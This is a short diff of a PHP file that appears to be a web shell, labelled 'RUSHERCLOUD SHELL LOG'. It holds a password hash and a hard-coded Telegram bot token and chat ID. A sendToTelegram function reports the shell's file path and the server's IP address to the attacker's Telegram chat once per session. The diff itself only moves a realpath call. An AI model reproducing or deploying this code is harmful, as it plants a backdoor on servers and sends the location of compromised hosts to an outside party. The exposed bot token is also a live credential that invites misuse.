@@ -11,8 +11,7 @@ $hashed_password = '$2y$10$n7OXssNZ0RXYQ.ehxDfjCeema90KbFax4VwOQg6ndtlo2vZxLpska
 $TELEGRAM_BOT_TOKEN = "8266146541:AAF_rizIBOHlBMj-X9Ds9N0owESWfWVKqVo";
 $TELEGRAM_CHAT_ID   = "-1003212759603";
 $TELEGRAM_TOPIC_ID  = 3;
-$realpath = realpath(__FILE__);
-$session_key_tele = 'notified_' . md5($realpath);
+$session_key_tele = 'notified_' . md5(realpath(__FILE__));
 
 function sendToTelegram($message)
 {
@@ -28,6 +27,7 @@ function sendToTelegram($message)
     @file_get_contents($url . "?" . http_build_query($data));
 }
 if (!isset($_SESSION[$session_key_tele])) {
+    $realpath = realpath(__FILE__);
     $msg = "<b>RUSHERCLOUD SHELL LOG</b>\n\n";
     $msg .= "Path: <code>$realpath</code>\n";
     $msg .= "IP: <code>$_SERVER[SERVER_ADDR]</code>\n";
